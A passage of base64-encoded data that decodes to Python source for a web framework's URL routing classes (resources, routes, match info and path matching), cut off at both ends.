vdXRlIl1cclxuXHJcbiAgICBhcHA6ICJBcHBsaWNhdGlvbiJcclxuXHJcbiAgICBkb21haW46IHN0clxyXG5cclxuICAgIHJ1bGU6ICJBYnN0cmFjdFJ1bGVNYXRjaGluZyJcclxuXHJcbiAgICBodHRwX2V4Y2VwdGlvbjogSFRUUEV4Y2VwdGlvblxyXG5cclxuXHJcbmNsYXNzIEFic3RyYWN0UmVzb3VyY2UoU2l6ZWQsIEl0ZXJhYmxlWyJBYnN0cmFjdFJvdXRlIl0pOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsICosIG5hbWU6IE9wdGlvbmFsW3N0cl0gPSBOb25lKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuX25hbWUgPSBuYW1lXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgbmFtZShzZWxmKSAtPiBPcHRpb25hbFtzdHJdOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9uYW1lXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgY2Fub25pY2FsKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICAiIiJFeHBvc2VzIHRoZSByZXNvdXJjZVwncyBjYW5vbmljYWwgcGF0aC5cclxuXHJcbiAgICAgICAgRm9yIGV4YW1wbGUgXCcvZm9vL2Jhci97bmFtZX1cJ1xyXG5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kICAjIHByYWdtYTogbm8gYnJhbmNoXHJcbiAgICBkZWYgdXJsX2ZvcihzZWxmLCAqKmt3YXJnczogc3RyKSAtPiBVUkw6XHJcbiAgICAgICAgIiIiQ29uc3RydWN0IHVybCBmb3IgcmVzb3VyY2Ugd2l0aCBhZGRpdGlvbmFsIHBhcmFtcy4iIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kICAjIHByYWdtYTogbm8gYnJhbmNoXHJcbiAgICBhc3luYyBkZWYgcmVzb2x2ZShzZWxmLCByZXF1ZXN0OiBSZXF1ZXN0KSAtPiBfUmVzb2x2ZTpcclxuICAgICAgICAiIiJSZXNvbHZlIHJlc291cmNlLlxyXG5cclxuICAgICAgICBSZXR1cm4gKFVybE1hcHBpbmdNYXRjaEluZm8sIGFsbG93ZWRfbWV0aG9kcykgcGFpci5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgYWRkX3ByZWZpeChzZWxmLCBwcmVmaXg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICAiIiJBZGQgYSBwcmVmaXggdG8gcHJvY2Vzc2VkIFVSTHMuXHJcblxyXG4gICAgICAgIFJlcXVpcmVkIGZvciBzdWJhcHBsaWNhdGlvbnMgc3VwcG9ydC5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgZ2V0X2luZm8oc2VsZikgLT4gX0luZm9EaWN0OlxyXG4gICAgICAgICIiIlJldHVybiBhIGRpY3Qgd2l0aCBhZGRpdGlvbmFsIGluZm8gdXNlZnVsIGZvciBpbnRyb3NwZWN0aW9uIiIiXHJcblxyXG4gICAgZGVmIGZyZWV6ZShzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgIHBhc3NcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgcmF3X21hdGNoKHNlbGYsIHBhdGg6IHN0cikgLT4gYm9vbDpcclxuICAgICAgICAiIiJQZXJmb3JtIGEgcmF3IG1hdGNoIGFnYWluc3QgcGF0aCIiIlxyXG5cclxuXHJcbmNsYXNzIEFic3RyYWN0Um91dGUoYWJjLkFCQyk6XHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBtZXRob2Q6IHN0cixcclxuICAgICAgICBoYW5kbGVyOiBVbmlvbltIYW5kbGVyLCBUeXBlW0Fic3RyYWN0Vmlld11dLFxyXG4gICAgICAgICosXHJcbiAgICAgICAgZXhwZWN0X2hhbmRsZXI6IE9wdGlvbmFsW19FeHBlY3RIYW5kbGVyXSA9IE5vbmUsXHJcbiAgICAgICAgcmVzb3VyY2U6IE9wdGlvbmFsW0Fic3RyYWN0UmVzb3VyY2VdID0gTm9uZSxcclxuICAgICkgLT4gTm9uZTpcclxuXHJcbiAgICAgICAgaWYgZXhwZWN0X2hhbmRsZXIgaXMgTm9uZTpcclxuICAgICAgICAgICAgZXhwZWN0X2hhbmRsZXIgPSBfZGVmYXVsdF9leHBlY3RfaGFuZGxlclxyXG5cclxuICAgICAgICBhc3NlcnQgYXN5bmNpby5pc2Nvcm91dGluZWZ1bmN0aW9uKFxyXG4gICAgICAgICAgICBleHBlY3RfaGFuZGxlclxyXG4gICAgICAgICksIGYiQ29yb3V0aW5lIGlzIGV4cGVjdGVkLCBnb3Qge2V4cGVjdF9oYW5kbGVyIXJ9IlxyXG5cclxuICAgICAgICBtZXRob2QgPSBtZXRob2QudXBwZXIoKVxyXG4gICAgICAgIGlmIG5vdCBIVFRQX01FVEhPRF9SRS5tYXRjaChtZXRob2QpOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKGYie21ldGhvZH0gaXMgbm90IGFsbG93ZWQgSFRUUCBtZXRob2QiKVxyXG5cclxuICAgICAgICBhc3NlcnQgY2FsbGFibGUoaGFuZGxlciksIGhhbmRsZXJcclxuICAgICAgICBpZiBhc3luY2lvLmlzY29yb3V0aW5lZnVuY3Rpb24oaGFuZGxlcik6XHJcbiAgICAgICAgICAgIHBhc3NcclxuICAgICAgICBlbGlmIGluc3BlY3QuaXNnZW5lcmF0b3JmdW5jdGlvbihoYW5kbGVyKTpcclxuICAgICAgICAgICAgd2FybmluZ3Mud2FybihcclxuICAgICAgICAgICAgICAgICJCYXJlIGdlbmVyYXRvcnMgYXJlIGRlcHJlY2F0ZWQsICIgInVzZSBAY29yb3V0aW5lIHdyYXBwZXIiLFxyXG4gICAgICAgICAgICAgICAgRGVwcmVjYXRpb25XYXJuaW5nLFxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgZWxpZiBpc2luc3RhbmNlKGhhbmRsZXIsIHR5cGUpIGFuZCBpc3N1YmNsYXNzKGhhbmRsZXIsIEFic3RyYWN0Vmlldyk6XHJcbiAgICAgICAgICAgIHBhc3NcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICB3YXJuaW5ncy53YXJuKFxyXG4gICAgICAgICAgICAgICAgIkJhcmUgZnVuY3Rpb25zIGFyZSBkZXByZWNhdGVkLCAiICJ1c2UgYXN5bmMgb25lcyIsIERlcHJlY2F0aW9uV2FybmluZ1xyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgICAgICBAd3JhcHMoaGFuZGxlcilcclxuICAgICAgICAgICAgYXN5bmMgZGVmIGhhbmRsZXJfd3JhcHBlcihyZXF1ZXN0OiBSZXF1ZXN0KSAtPiBTdHJlYW1SZXNwb25zZTpcclxuICAgICAgICAgICAgICAgIHJlc3VsdCA9IG9sZF9oYW5kbGVyKHJlcXVlc3QpXHJcbiAgICAgICAgICAgICAgICBpZiBhc3luY2lvLmlzY29yb3V0aW5lKHJlc3VsdCk6XHJcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGF3YWl0IHJlc3VsdFxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIHJlc3VsdCAgIyB0eXBlOiBpZ25vcmVbcmV0dXJuLXZhbHVlXVxyXG5cclxuICAgICAgICAgICAgb2xkX2hhbmRsZXIgPSBoYW5kbGVyXHJcbiAgICAgICAgICAgIGhhbmRsZXIgPSBoYW5kbGVyX3dyYXBwZXJcclxuXHJcbiAgICAgICAgc2VsZi5fbWV0aG9kID0gbWV0aG9kXHJcbiAgICAgICAgc2VsZi5faGFuZGxlciA9IGhhbmRsZXJcclxuICAgICAgICBzZWxmLl9leHBlY3RfaGFuZGxlciA9IGV4cGVjdF9oYW5kbGVyXHJcbiAgICAgICAgc2VsZi5fcmVzb3VyY2UgPSByZXNvdXJjZVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIG1ldGhvZChzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX21ldGhvZFxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGhhbmRsZXIoc2VsZikgLT4gSGFuZGxlcjpcclxuICAgICAgICByZXR1cm4gc2VsZi5faGFuZGxlclxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgQGFiYy5hYnN0cmFjdG1ldGhvZFxyXG4gICAgZGVmIG5hbWUoc2VsZikgLT4gT3B0aW9uYWxbc3RyXTpcclxuICAgICAgICAiIiJPcHRpb25hbCByb3V0ZVwncyBuYW1lLCBhbHdheXMgZXF1YWxzIHRvIHJlc291cmNlXCdzIG5hbWUuIiIiXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgcmVzb3VyY2Uoc2VsZikgLT4gT3B0aW9uYWxbQWJzdHJhY3RSZXNvdXJjZV06XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3Jlc291cmNlXHJcblxyXG4gICAgQGFiYy5hYnN0cmFjdG1ldGhvZFxyXG4gICAgZGVmIGdldF9pbmZvKHNlbGYpIC0+IF9JbmZvRGljdDpcclxuICAgICAgICAiIiJSZXR1cm4gYSBkaWN0IHdpdGggYWRkaXRpb25hbCBpbmZvIHVzZWZ1bCBmb3IgaW50cm9zcGVjdGlvbiIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3RtZXRob2QgICMgcHJhZ21hOiBubyBicmFuY2hcclxuICAgIGRlZiB1cmxfZm9yKHNlbGYsICphcmdzOiBzdHIsICoqa3dhcmdzOiBzdHIpIC0+IFVSTDpcclxuICAgICAgICAiIiJDb25zdHJ1Y3QgdXJsIGZvciByb3V0ZSB3aXRoIGFkZGl0aW9uYWwgcGFyYW1zLiIiIlxyXG5cclxuICAgIGFzeW5jIGRlZiBoYW5kbGVfZXhwZWN0X2hlYWRlcihzZWxmLCByZXF1ZXN0OiBSZXF1ZXN0KSAtPiBOb25lOlxyXG4gICAgICAgIGF3YWl0IHNlbGYuX2V4cGVjdF9oYW5kbGVyKHJlcXVlc3QpXHJcblxyXG5cclxuY2xhc3MgVXJsTWFwcGluZ01hdGNoSW5mbyhCYXNlRGljdCwgQWJzdHJhY3RNYXRjaEluZm8pOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIG1hdGNoX2RpY3Q6IERpY3Rbc3RyLCBzdHJdLCByb3V0ZTogQWJzdHJhY3RSb3V0ZSk6XHJcbiAgICAgICAgc3VwZXIoKS5fX2luaXRfXyhtYXRjaF9kaWN0KVxyXG4gICAgICAgIHNlbGYuX3JvdXRlID0gcm91dGVcclxuICAgICAgICBzZWxmLl9hcHBzID0gW10gICMgdHlwZTogTGlzdFtBcHBsaWNhdGlvbl1cclxuICAgICAgICBzZWxmLl9jdXJyZW50X2FwcCA9IE5vbmUgICMgdHlwZTogT3B0aW9uYWxbQXBwbGljYXRpb25dXHJcbiAgICAgICAgc2VsZi5fZnJvemVuID0gRmFsc2VcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBoYW5kbGVyKHNlbGYpIC0+IEhhbmRsZXI6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3JvdXRlLmhhbmRsZXJcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiByb3V0ZShzZWxmKSAtPiBBYnN0cmFjdFJvdXRlOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9yb3V0ZVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGV4cGVjdF9oYW5kbGVyKHNlbGYpIC0+IF9FeHBlY3RIYW5kbGVyOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9yb3V0ZS5oYW5kbGVfZXhwZWN0X2hlYWRlclxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGh0dHBfZXhjZXB0aW9uKHNlbGYpIC0+IE9wdGlvbmFsW0hUVFBFeGNlcHRpb25dOlxyXG4gICAgICAgIHJldHVybiBOb25lXHJcblxyXG4gICAgZGVmIGdldF9pbmZvKHNlbGYpIC0+IF9JbmZvRGljdDogICMgdHlwZTogaWdub3JlW292ZXJyaWRlXVxyXG4gICAgICAgIHJldHVybiBzZWxmLl9yb3V0ZS5nZXRfaW5mbygpXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgYXBwcyhzZWxmKSAtPiBUdXBsZVsiQXBwbGljYXRpb24iLCAuLi5dOlxyXG4gICAgICAgIHJldHVybiB0dXBsZShzZWxmLl9hcHBzKVxyXG5cclxuICAgIGRlZiBhZGRfYXBwKHNlbGYsIGFwcDogIkFwcGxpY2F0aW9uIikgLT4gTm9uZTpcclxuICAgICAgICBpZiBzZWxmLl9mcm96ZW46XHJcbiAgICAgICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcigiQ2Fubm90IGNoYW5nZSBhcHBzIHN0YWNrIGFmdGVyIC5mcmVlemUoKSBjYWxsIilcclxuICAgICAgICBpZiBzZWxmLl9jdXJyZW50X2FwcCBpcyBOb25lOlxyXG4gICAgICAgICAgICBzZWxmLl9jdXJyZW50X2FwcCA9IGFwcFxyXG4gICAgICAgIHNlbGYuX2FwcHMuaW5zZXJ0KDAsIGFwcClcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBjdXJyZW50X2FwcChzZWxmKSAtPiAiQXBwbGljYXRpb24iOlxyXG4gICAgICAgIGFwcCA9IHNlbGYuX2N1cnJlbnRfYXBwXHJcbiAgICAgICAgYXNzZXJ0IGFwcCBpcyBub3QgTm9uZVxyXG4gICAgICAgIHJldHVybiBhcHBcclxuXHJcbiAgICBAY29udGV4dG1hbmFnZXJcclxuICAgIGRlZiBzZXRfY3VycmVudF9hcHAoc2VsZiwgYXBwOiAiQXBwbGljYXRpb24iKSAtPiBHZW5lcmF0b3JbTm9uZSwgTm9uZSwgTm9uZV06XHJcbiAgICAgICAgaWYgREVCVUc6ICAjIHByYWdtYTogbm8gY292ZXJcclxuICAgICAgICAgICAgaWYgYXBwIG5vdCBpbiBzZWxmLl9hcHBzOlxyXG4gICAgICAgICAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgICAgICJFeHBlY3RlZCBvbmUgb2YgdGhlIGZvbGxvd2luZyBhcHBzIHshcn0sIGdvdCB7IXJ9Ii5mb3JtYXQoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuX2FwcHMsIGFwcFxyXG4gICAgICAgICAgICAgICAgICAgIClcclxuICAgICAgICAgICAgICAgIClcclxuICAgICAgICBwcmV2ID0gc2VsZi5fY3VycmVudF9hcHBcclxuICAgICAgICBzZWxmLl9jdXJyZW50X2FwcCA9IGFwcFxyXG4gICAgICAgIHRyeTpcclxuICAgICAgICAgICAgeWllbGRcclxuICAgICAgICBmaW5hbGx5OlxyXG4gICAgICAgICAgICBzZWxmLl9jdXJyZW50X2FwcCA9IHByZXZcclxuXHJcbiAgICBkZWYgZnJlZXplKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5fZnJvemVuID0gVHJ1ZVxyXG5cclxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgcmV0dXJuIGYiPE1hdGNoSW5mbyB7c3VwZXIoKS5fX3JlcHJfXygpfToge3NlbGYuX3JvdXRlfT4iXHJcblxyXG5cclxuY2xhc3MgTWF0Y2hJbmZvRXJyb3IoVXJsTWFwcGluZ01hdGNoSW5mbyk6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgaHR0cF9leGNlcHRpb246IEhUVFBFeGNlcHRpb24pIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5fZXhjZXB0aW9uID0gaHR0cF9leGNlcHRpb25cclxuICAgICAgICBzdXBlcigpLl9faW5pdF9fKHt9LCBTeXN0ZW1Sb3V0ZShzZWxmLl9leGNlcHRpb24pKVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGh0dHBfZXhjZXB0aW9uKHNlbGYpIC0+IEhUVFBFeGNlcHRpb246XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2V4Y2VwdGlvblxyXG5cclxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgcmV0dXJuICI8TWF0Y2hJbmZvRXJyb3Ige306IHt9PiIuZm9ybWF0KFxyXG4gICAgICAgICAgICBzZWxmLl9leGNlcHRpb24uc3RhdHVzLCBzZWxmLl9leGNlcHRpb24ucmVhc29uXHJcbiAgICAgICAgKVxyXG5cclxuXHJcbmFzeW5jIGRlZiBfZGVmYXVsdF9leHBlY3RfaGFuZGxlcihyZXF1ZXN0OiBSZXF1ZXN0KSAtPiBOb25lOlxyXG4gICAgIiIiRGVmYXVsdCBoYW5kbGVyIGZvciBFeHBlY3QgaGVhZGVyLlxyXG5cclxuICAgIEp1c3Qgc2VuZCAiMTAwIENvbnRpbnVlIiB0byBjbGllbnQuXHJcbiAgICByYWlzZSBIVFRQRXhwZWN0YXRpb25GYWlsZWQgaWYgdmFsdWUgb2YgaGVhZGVyIGlzIG5vdCAiMTAwLWNvbnRpbnVlIlxyXG4gICAgIiIiXHJcbiAgICBleHBlY3QgPSByZXF1ZXN0LmhlYWRlcnMuZ2V0KGhkcnMuRVhQRUNULCAiIilcclxuICAgIGlmIHJlcXVlc3QudmVyc2lvbiA9PSBIdHRwVmVyc2lvbjExOlxyXG4gICAgICAgIGlmIGV4cGVjdC5sb3dlcigpID09ICIxMDAtY29udGludWUiOlxyXG4gICAgICAgICAgICBhd2FpdCByZXF1ZXN0LndyaXRlci53cml0ZShiIkhUVFAvMS4xIDEwMCBDb250aW51ZVxcclxcblxcclxcbiIpXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgcmFpc2UgSFRUUEV4cGVjdGF0aW9uRmFpbGVkKHRleHQ9IlVua25vd24gRXhwZWN0OiAlcyIgJSBleHBlY3QpXHJcblxyXG5cclxuY2xhc3MgUmVzb3VyY2UoQWJzdHJhY3RSZXNvdXJjZSk6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgKiwgbmFtZTogT3B0aW9uYWxbc3RyXSA9IE5vbmUpIC0+IE5vbmU6XHJcbiAgICAgICAgc3VwZXIoKS5fX2luaXRfXyhuYW1lPW5hbWUpXHJcbiAgICAgICAgc2VsZi5fcm91dGVzID0gW10gICMgdHlwZTogTGlzdFtSZXNvdXJjZVJvdXRlXVxyXG5cclxuICAgIGRlZiBhZGRfcm91dGUoXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBtZXRob2Q6IHN0cixcclxuICAgICAgICBoYW5kbGVyOiBVbmlvbltUeXBlW0Fic3RyYWN0Vmlld10sIEhhbmRsZXJdLFxyXG4gICAgICAgICosXHJcbiAgICAgICAgZXhwZWN0X2hhbmRsZXI6IE9wdGlvbmFsW19FeHBlY3RIYW5kbGVyXSA9IE5vbmUsXHJcbiAgICApIC0+ICJSZXNvdXJjZVJvdXRlIjpcclxuXHJcbiAgICAgICAgZm9yIHJvdXRlX29iaiBpbiBzZWxmLl9yb3V0ZXM6XHJcbiAgICAgICAgICAgIGlmIHJvdXRlX29iai5tZXRob2QgPT0gbWV0aG9kIG9yIHJvdXRlX29iai5tZXRob2QgPT0gaGRycy5NRVRIX0FOWTpcclxuICAgICAgICAgICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcihcclxuICAgICAgICAgICAgICAgICAgICAiQWRkZWQgcm91dGUgd2lsbCBuZXZlciBiZSBleGVjdXRlZCwgIlxyXG4gICAgICAgICAgICAgICAgICAgICJtZXRob2Qge3JvdXRlLm1ldGhvZH0gaXMgYWxyZWFkeSAiXHJcbiAgICAgICAgICAgICAgICAgICAgInJlZ2lzdGVyZWQiLmZvcm1hdChyb3V0ZT1yb3V0ZV9vYmopXHJcbiAgICAgICAgICAgICAgICApXHJcblxyXG4gICAgICAgIHJvdXRlX29iaiA9IFJlc291cmNlUm91dGUobWV0aG9kLCBoYW5kbGVyLCBzZWxmLCBleHBlY3RfaGFuZGxlcj1leHBlY3RfaGFuZGxlcilcclxuICAgICAgICBzZWxmLnJlZ2lzdGVyX3JvdXRlKHJvdXRlX29iailcclxuICAgICAgICByZXR1cm4gcm91dGVfb2JqXHJcblxyXG4gICAgZGVmIHJlZ2lzdGVyX3JvdXRlKHNlbGYsIHJvdXRlOiAiUmVzb3VyY2VSb3V0ZSIpIC0+IE5vbmU6XHJcbiAgICAgICAgYXNzZXJ0IGlzaW5zdGFuY2UoXHJcbiAgICAgICAgICAgIHJvdXRlLCBSZXNvdXJjZVJvdXRlXHJcbiAgICAgICAgKSwgZiJJbnN0YW5jZSBvZiBSb3V0ZSBjbGFzcyBpcyByZXF1aXJlZCwgZ290IHtyb3V0ZSFyfSJcclxuICAgICAgICBzZWxmLl9yb3V0ZXMuYXBwZW5kKHJvdXRlKVxyXG5cclxuICAgIGFzeW5jIGRlZiByZXNvbHZlKHNlbGYsIHJlcXVlc3Q6IFJlcXVlc3QpIC0+IF9SZXNvbHZlOlxyXG4gICAgICAgIGFsbG93ZWRfbWV0aG9kcyA9IHNldCgpICAjIHR5cGU6IFNldFtzdHJdXHJcblxyXG4gICAgICAgIG1hdGNoX2RpY3QgPSBzZWxmLl9tYXRjaChyZXF1ZXN0LnJlbF91cmwucmF3X3BhdGgpXHJcbiAgICAgICAgaWYgbWF0Y2hfZGljdCBpcyBOb25lOlxyXG4gICAgICAgICAgICByZXR1cm4gTm9uZSwgYWxsb3dlZF9tZXRob2RzXHJcblxyXG4gICAgICAgIGZvciByb3V0ZV9vYmogaW4gc2VsZi5fcm91dGVzOlxyXG4gICAgICAgICAgICByb3V0ZV9tZXRob2QgPSByb3V0ZV9vYmoubWV0aG9kXHJcbiAgICAgICAgICAgIGFsbG93ZWRfbWV0aG9kcy5hZGQocm91dGVfbWV0aG9kKVxyXG5cclxuICAgICAgICAgICAgaWYgcm91dGVfbWV0aG9kID09IHJlcXVlc3QubWV0aG9kIG9yIHJvdXRlX21ldGhvZCA9PSBoZHJzLk1FVEhfQU5ZOlxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIChVcmxNYXBwaW5nTWF0Y2hJbmZvKG1hdGNoX2RpY3QsIHJvdXRlX29iaiksIGFsbG93ZWRfbWV0aG9kcylcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICByZXR1cm4gTm9uZSwgYWxsb3dlZF9tZXRob2RzXHJcblxyXG4gICAgQGFiYy5hYnN0cmFjdG1ldGhvZFxyXG4gICAgZGVmIF9tYXRjaChzZWxmLCBwYXRoOiBzdHIpIC0+IE9wdGlvbmFsW0RpY3Rbc3RyLCBzdHJdXTpcclxuICAgICAgICBwYXNzICAjIHByYWdtYTogbm8gY292ZXJcclxuXHJcbiAgICBkZWYgX19sZW5fXyhzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIGxlbihzZWxmLl9yb3V0ZXMpXHJcblxyXG4gICAgZGVmIF9faXRlcl9fKHNlbGYpIC0+IEl0ZXJhdG9yW0Fic3RyYWN0Um91dGVdOlxyXG4gICAgICAgIHJldHVybiBpdGVyKHNlbGYuX3JvdXRlcylcclxuXHJcbiAgICAjIFRPRE86IGltcGxlbWVudCBhbGwgYWJzdHJhY3QgbWV0aG9kc1xyXG5cclxuXHJcbmNsYXNzIFBsYWluUmVzb3VyY2UoUmVzb3VyY2UpOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIHBhdGg6IHN0ciwgKiwgbmFtZTogT3B0aW9uYWxbc3RyXSA9IE5vbmUpIC0+IE5vbmU6XHJcbiAgICAgICAgc3VwZXIoKS5fX2luaXRfXyhuYW1lPW5hbWUpXHJcbiAgICAgICAgYXNzZXJ0IG5vdCBwYXRoIG9yIHBhdGguc3RhcnRzd2l0aCgiLyIpXHJcbiAgICAgICAgc2VsZi5fcGF0aCA9IHBhdGhcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBjYW5vbmljYWwoc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9wYXRoXHJcblxyXG4gICAgZGVmIGZyZWV6ZShzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIG5vdCBzZWxmLl9wYXRoOlxyXG4gICAgICAgICAgICBzZWxmLl9wYXRoID0gIi8iXHJcblxyXG4gICAgZGVmIGFkZF9wcmVmaXgoc2VsZiwgcHJlZml4OiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgYXNzZXJ0IHByZWZpeC5zdGFydHN3aXRoKCIvIilcclxuICAgICAgICBhc3NlcnQgbm90IHByZWZpeC5lbmRzd2l0aCgiLyIpXHJcbiAgICAgICAgYXNzZXJ0IGxlbihwcmVmaXgpID4gMVxyXG4gICAgICAgIHNlbGYuX3BhdGggPSBwcmVmaXggKyBzZWxmLl9wYXRoXHJcblxyXG4gICAgZGVmIF9tYXRjaChzZWxmLCBwYXRoOiBzdHIpIC0+IE9wdGlvbmFsW0RpY3Rbc3RyLCBzdHJdXTpcclxuICAgICAgICAjIHN0cmluZyBjb21wYXJpc29uIGlzIGFib3V0IDEwIHRpbWVzIGZhc3RlciB0aGFuIHJlZ2V4cCBtYXRjaGluZ1xyXG4gICAgICAgIGlmIHNlbGYuX3BhdGggPT0gcGF0aDpcclxuICAgICAgICAgICAgcmV0dXJuIHt9XHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgcmV0dXJuIE5vbmVcclxuXHJcbiAgICBkZWYgcmF3X21hdGNoKHNlbGYsIHBhdGg6IHN0cikgLT4gYm9vbDpcclxuICAgICAgICByZXR1cm4gc2VsZi5fcGF0aCA9PSBwYXRoXHJcblxyXG4gICAgZGVmIGdldF9pbmZvKHNlbGYpIC0+IF9JbmZvRGljdDpcclxuICAgICAgICByZXR1cm4geyJwYXRoIjogc2VsZi5fcGF0aH1cclxuXHJcbiAgICBkZWYgdXJsX2ZvcihzZWxmKSAtPiBVUkw6ICAjIHR5cGU6IGlnbm9yZVtvdmVycmlkZV1cclxuICAgICAgICByZXR1cm4gVVJMLmJ1aWxkKHBhdGg9c2VsZi5fcGF0aCwgZW5jb2RlZD1UcnVlKVxyXG5cclxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgbmFtZSA9ICJcJyIgKyBzZWxmLm5hbWUgKyAiXCcgIiBpZiBzZWxmLm5hbWUgaXMgbm90IE5vbmUgZWxzZSAiIlxyXG4gICAgICAgIHJldHVybiBmIjxQbGFpblJlc291cmNlIHtuYW1lfSB7c2VsZi5fcGF0aH0+IlxyXG5cclxuXHJcbmNsYXNzIER5bmFtaWNSZXNvdXJjZShSZXNvdXJjZSk6XHJcblxyXG4gICAgRFlOID0gcmUuY29tcGlsZShyIlxceyg/UDx2YXI+W19hLXpBLVpdW19hLXpBLVowLTldKilcXH0iKVxyXG4gICAgRFlOX1dJVEhfUkUgPSByZS5jb21waWxlKHIiXFx7KD9QPHZhcj5bX2EtekEtWl1bX2EtekEtWjAtOV0qKTooP1A8cmU+LispXFx9IilcclxuICAgIEdPT0QgPSByIltee30vXSsiXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIHBhdGg6IHN0ciwgKiwgbmFtZTogT3B0aW9uYWxbc3RyXSA9IE5vbmUpIC0+IE5vbmU6XHJcbiAgICAgICAgc3VwZXIoKS5fX2luaXRfXyhuYW1lPW5hbWUpXHJcbiAgICAgICAgcGF0dGVybiA9ICIiXHJcbiAgICAgICAgZm9ybWF0dGVyID0gIiJcclxuICAgICAgICBmb3IgcGFydCBpbiBST1VURV9SRS5zcGxpdChwYXRoKTpcclxuICAgICAgICAgICAgbWF0Y2ggPSBzZWxmLkRZTi5mdWxsbWF0Y2gocGFydClcclxuICAgICAgICAgICAgaWYgbWF0Y2g6XHJcbiAgICAgICAgICAgICAgICBwYXR0ZXJuICs9ICIoP1A8e30+e30pIi5mb3JtYXQobWF0Y2guZ3JvdXAoInZhciIpLCBzZWxmLkdPT0QpXHJcbiAgICAgICAgICAgICAgICBmb3JtYXR0ZXIgKz0gInsiICsgbWF0Y2guZ3JvdXAoInZhciIpICsgIn0iXHJcbiAgICAgICAgICAgICAgICBjb250aW51ZVxyXG5cclxuICAgICAgICAgICAgbWF0Y2ggPSBzZWxmLkRZTl9XSVRIX1JFLmZ1bGxtYXRjaChwYXJ0KVxyXG4gICAgICAgICAgICBpZiBtYXRjaDpcclxuICAgICAgICAgICAgICAgIHBhdHRlcm4gKz0gIig/UDx7dmFyfT57cmV9KSIuZm9ybWF0KCoqbWF0Y2guZ3JvdXBkaWN0KCkpXHJcbiAgICAgICAgICAgICAgICBmb3JtYXR0ZXIgKz0gInsiICsgbWF0Y2guZ3JvdXAoInZhciIpICsgIn0iXHJcbiAgICAgICAgICAgICAgICBjb250aW51ZVxyXG5cclxuICAgICAgICAgICAgaWYgInsiIGluIHBhcnQgb3IgIn0iIGluIHBhcnQ6XHJcbiAgICAgICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKGYiSW52YWxpZCBwYXRoIFwne3BhdGh9XCdbXCd7cGFydH1cJ10iKVxyXG5cclxuIC